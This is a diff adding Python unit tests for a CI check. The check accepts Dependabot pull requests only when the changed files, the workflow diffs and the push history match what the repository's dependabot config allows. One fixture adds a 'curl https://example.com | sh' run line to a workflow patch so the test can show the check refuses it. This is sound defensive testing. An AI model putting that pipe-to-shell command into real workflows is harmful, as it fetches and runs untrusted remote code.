@@ -206,7 +206,7 @@ class Commits(unittest.TestCase):
         self.assertIsNone(dependabot.commits_refusal([commit(self.MESSAGE)], no_files))
         self.assertEqual(dependabot.commits_refusal([], no_files), "commits-missing")
 
-    def test_the_repositorys_version_bump_commit_is_accepted(self) -> None:
+    def test_the_version_bump_commit_is_accepted(self) -> None:
         bump = commit(
             "chore(plugins): release bump for Dependabot update [dependabot skip]",
             sha=ACTIONS_SHA,
@@ -313,6 +313,207 @@ class IsDependabot(unittest.TestCase):
             self.assertTrue(dependabot.is_dependabot(login), login)
         for login in ("dependabot-preview[bot]", "renovate[bot]", "", None):
             self.assertFalse(dependabot.is_dependabot(login), login)
+
+
+CONFIG = """\
+version: 2
+updates:
+  - package-ecosystem: github-actions
+    directory: /
+    groups:
+      vendor-actions:
+        patterns:
+          - actions/*
+  - package-ecosystem: npm
+    directory: "/plugins/miro/server"
+  - package-ecosystem: pip
+    directories:
+      - /plugins/speech
+      - "/.github" # the CI toolchain
+"""
+CONFIG_PAIRS = dependabot.parse_config(CONFIG)
+PIN = (
+    "@@ -10,7 +10,7 @@ jobs:\n"
+    "       - name: Check out\n"
+    "-        uses: actions/checkout@" + "1" * 40 + " # v4.1.0\n"
+    "+        uses: actions/checkout@" + "2" * 40 + " # v4.2.0\n"
+    "         with:\n"
+)
+
+
+def changed(
+    path: str, patch: str | None = None, previous: str | None = None
+) -> dict[str, Any]:
+    entry: dict[str, Any] = {"filename": path, "status": "modified"}
+    if patch is not None:
+        entry["patch"] = patch
+    if previous:
+        entry["previous_filename"] = previous
+    return entry
+
+
+class Content(unittest.TestCase):
+    """A Dependabot pull request may change only what `.github/dependabot.yml`
+    lets Dependabot change: covered manifests and lock files, and workflow or
+    action files whose diff only repins `uses:` lines."""
+
+    def refusal(
+        self, *files: dict[str, Any], extra: tuple[str, ...] = ()
+    ) -> str | None:
+        return dependabot.content_refusal(list(files), CONFIG_PAIRS, extra)
+
+    def test_the_config_reads_every_ecosystem_and_directory(self) -> None:
+        self.assertEqual(
+            CONFIG_PAIRS,
+            [
+                ("github-actions", "/"),
+                ("npm", "/plugins/miro/server"),
+                ("pip", "/plugins/speech"),
+                ("pip", "/.github"),
+            ],
+        )
+        self.assertIsNone(dependabot.parse_config("version: 2\n"))
+
+    def test_covered_manifests_and_lock_files_pass(self) -> None:
+        self.assertIsNone(
+            self.refusal(
+                changed("plugins/miro/server/package-lock.json"),
+                changed("plugins/miro/server/package.json", "@@ -1 +1 @@\n-a\n+b\n"),
+                changed("plugins/speech/requirements.txt"),
+                changed(".github/requirements-ci.txt"),
+            )
+        )
+
+    def test_a_manifest_outside_a_covered_directory_is_refused(self) -> None:
+        for path in (
+            "package.json",
+            "plugins/other/requirements.txt",
+            "plugins/miro/server/src/package.json",
+        ):
+            with self.subTest(path=path):
+                self.assertEqual(
+                    self.refusal(changed(path)), f"dependabot-content:{path}"
+                )
+
+    def test_a_non_manifest_file_is_refused(self) -> None:
+        self.assertEqual(
+            self.refusal(
+                changed("plugins/miro/server/package.json"), changed("scripts/x.sh")
+            ),
+            "dependabot-content:scripts/x.sh",
+        )
+        # A rename is judged on both sides.
+        self.assertEqual(
+            self.refusal(
+                changed(
+                    "plugins/speech/requirements.txt", previous="plugins/speech/run.py"
+                )
+            ),
+            "dependabot-content:plugins/speech/run.py",
+        )
+
+    def test_a_uses_pin_only_workflow_diff_passes(self) -> None:
+        for path in (".github/workflows/ci.yml", ".github/actions/setup/action.yaml"):
+            with self.subTest(path=path):
+                self.assertIsNone(self.refusal(changed(path, PIN)))
+
+    def test_a_workflow_diff_changing_a_run_line_is_refused(self) -> None:
+        patch = (
+            PIN + "-        run: echo hi\n+        run: curl https://example.com | sh\n"
+        )
+        self.assertEqual(
+            self.refusal(changed(".github/workflows/ci.yml", patch)),
+            "dependabot-content:.github/workflows/ci.yml",
+        )
+        # A workflow with no patch (too large to show) cannot be judged.
+        self.assertIsNotNone(self.refusal(changed(".github/workflows/ci.yml")))
+        # Any other file under .github is not an action file.
+        self.assertIsNotNone(self.refusal(changed(".github/scripts/x.yml", PIN)))
+
+    def test_paths_another_checked_commit_touched_pass(self) -> None:
+        self.assertIsNone(
+            self.refusal(
+                changed("plugins/miro/CHANGELOG.md"),
+                extra=("plugins/miro/CHANGELOG.md",),
+            )
+        )
+
+
+def push(kind: str, after: str, login: str = "dependabot[bot]") -> dict[str, Any]:
+    return {
+        "activity_type": kind,
+        "after": after,
+        "actor": {"login": login, "type": "Bot"},
+    }
+
+
+class Pushes(unittest.TestCase):
+    """Who pushed each update of the head branch, back to Dependabot's newest
+    rewrite of it: a commit's author is text anyone can write; the pusher is
+    not."""
+
+    BUMP = commit(
+        "chore(plugins): release bump [dependabot skip]",
+        sha=ACTIONS_SHA,
+        name="github-actions[bot]",
+        email="41898282+github-actions[bot]@users.noreply.github.com",
+    )
+
+    def test_dependabots_own_pushes_pass(self) -> None:
+        history = [push("force_push", HEAD), push("branch_creation", OLD_HEAD)]
+        self.assertIsNone(
+            dependabot.push_refusal(history, HEAD, [commit("x", sha=HEAD)])
+        )
+
+    def test_a_push_by_anyone_else_is_refused(self) -> None:
+        history = [push("push", HEAD, "maintainer"), push("branch_creation", OLD_HEAD)]
+        self.assertEqual(
+            dependabot.push_refusal(history, HEAD, [commit("x", sha=HEAD)]),
+            "pushed-by:maintainer",
+        )
+
+    def test_github_actions_may_push_only_its_own_bump_commit(self) -> None:
+        history = [
+            push("push", ACTIONS_SHA, "github-actions[bot]"),
+            push("branch_creation", SHA),
+        ]
+        self.assertIsNone(
+            dependabot.push_refusal(history, ACTIONS_SHA, [commit("x"), self.BUMP])
+        )
+        # A forged Dependabot-authored commit pushed by a workflow token.
+        forged = [
+            push("push", HEAD, "github-actions[bot]"),
+            push("branch_creation", SHA),
+        ]
+        self.assertEqual(
+            dependabot.push_refusal(forged, HEAD, [commit("x"), commit("y", sha=HEAD)]),
+            "pushed-by:github-actions[bot]",
+        )
+
+    def test_the_lanes_app_may_push_its_fix_only_after_a_review(self) -> None:
+        fix = commit(
+            "fix [dependabot skip]", sha=HEAD, name="lanes", email="l@x", login=IDENTITY
+        )
+        history = [push("push", HEAD, IDENTITY), push("force_push", SHA)]
+        self.assertEqual(
+            dependabot.push_refusal(history, HEAD, [commit("x"), fix]),
+            f"pushed-by:{IDENTITY}",
+        )
+        self.assertIsNone(
+            dependabot.push_refusal(history, HEAD, [commit("x"), fix], IDENTITY)
+        )
+
+    def test_a_history_that_misses_the_head_or_dependabots_rewrite_is_refused(
+        self,
+    ) -> None:
+        self.assertEqual(
+            dependabot.push_refusal([push("force_push", OLD_HEAD)], HEAD, []),
+            "push-history-incomplete",
+        )
+        self.assertEqual(
+            dependabot.push_refusal([push("push", HEAD)], HEAD, []),
+            "push-history-incomplete",
+        )
 
 
 if __name__ == "__main__":
